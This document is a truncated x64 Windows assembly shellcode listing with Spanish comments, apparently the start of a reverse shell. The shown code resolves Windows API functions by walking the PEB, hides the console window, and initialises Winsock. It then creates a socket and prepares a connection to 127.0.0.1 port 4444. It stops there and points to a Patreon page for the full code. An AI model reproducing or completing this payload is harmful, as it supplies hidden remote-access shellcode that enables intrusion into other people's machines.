;//////////Codigo por Belial Grimoire////////////
;/////bgpavelang.github.io//////
;///Gracias por credito a mi trabajo/////
;//////////////////////////////////////////

global _start

section .text

xor rcx, rcx
mov rax, [gs:rcx+0x60]
mov rax, [rax+0x18]
mov rsi, [rax+0x20]
lodsq
xchg rsi, rax
lodsq
mov rbx, [rax+0x20]

mov edx, [rbx+0x3c]
add rdx, rbx
mov edx, [rdx+0x88]
add rdx, rbx
mov esi, [rdx+0x20]
add rsi, rbx

push rsi
push rdx
push rsi
push rdx

xor rcx, rcx
mov r10, 0x41636f7250746547

jm_GPA:
inc rcx                  
lodsd
add rax, rbx
cmp qword[rax], r10
jnz jm_GPA

dec rcx

mov esi, [rdx+0x24]
add rsi, rbx
mov cx, [rsi+rcx*2]
mov esi, [rdx+0x1c]
add rsi, rbx
mov edx, [rsi+rcx*4]
add rdx, rbx

mov r14, rdx  ;GetProcAddress

pop rdx
pop rsi

xor rcx, rcx
mov r12, 0x6f736e6f43746547
mov r13, 0x776f646e6957656c

jm_G_Cons:
inc rcx
lodsd
add rax, rbx
cmp qword[rax], r12
jnz jm_G_Cons
cmp qword[rax+0x8], r13
jnz jm_G_Cons

dec rcx


mov esi, [rdx+0x24]
add rsi, rbx
mov cx, [rsi+rcx*2]
mov esi, [rdx+0x1c]
add rsi, rbx
mov edx, [rsi+rcx*4]
add rdx, rbx

mov r12, rdx  ;Console
call r12
mov r15, rax

xor rcx, rcx
push rcx
mov rcx, 0x41797261
push rcx
mov rcx, 0x7262694c64616f4c
push rcx
mov rdx, rsp
mov rcx, rbx
sub rsp, 0x30

call r14

mov r13, rax  ;LoadLibrary

add rsp, 0x48

xor rcx, rcx
push rcx
mov rcx, 0x6c6c
push rcx
mov rcx, 0x642e323372657375  ;user32.dll
push rcx
mov rcx, rsp
sub rsp, 0x30           
call r13

add rsp, 0x48
xor rcx, rcx

push rcx
mov rcx, 0x776f
push rcx
mov rcx, 0x646e6957776f6853 ;ShowWindow
push rcx
mov rdx, rsp
mov rcx, rax

sub rsp, 0x30
call r14

sub rsp, 0x48

xor rcx, rcx
mov rdx, rcx
mov rcx, r15
call rax        ;ejecucion de showwindow

add rsp, 0x90

xor rcx, rcx
push rcx
mov rcx, 0x6c6c
push rcx
mov rcx, 0x642e32335f327377  ;ws2_32.dll
push rcx
mov rcx, rsp

sub rsp, 0x30
call r13

mov r15, rax
add rsp, 0x48

xor rcx, rcx
push rcx
mov rcx, 0x7075
push rcx
mov rcx, 0x7472617453415357 ;WSAStartup
push rcx
mov rdx, rsp
mov rcx, r15

sub rsp, 0x30
call r14

add rsp, 0x48

mov r12, rbx

pop rbp  ;kernel
pop r13  ;AddrOfFun

xor rcx, rcx
push rcx
mov cx, 0x0190
sub rsp, rcx
mov rdx, rsp
call rax

add rsp, 0x0190

xor rcx, rcx
mov rcx, 0x4174
push rcx
mov rcx, 0x656b636f53415357 ;WSASocketA
push rcx
mov rdx, rsp 
mov rcx, r15

sub rsp, 0x30
call r14

add rsp, 0x40

xor rcx, rcx
mov [rsp+32], rcx
mov [rsp+40], rcx

push rcx
pop r9
mov r8b, 6
inc rcx
mov rdx, rcx
inc rcx
call rax

mov rdi, rax  ;socket decriptor

xor rcx, rcx
mov rcx, 0x7463656e6e6f63
push rcx
mov rdx, rsp
mov rcx, r15

sub rsp, 0x28
call r14

add rsp, 0x30

xor r8, r8
xor rcx, rcx

xor r14, r14

lea r14, [rsp]

mov [r14+4], dword 0x0100007f
mov [r14+2], word 0x5c11
mov [r14], word 0x2

xor r9, r9

......

Código completo en...
https://www.patreon.com/BGPavelAng
Ayudame a seguir haciendo más de esto.

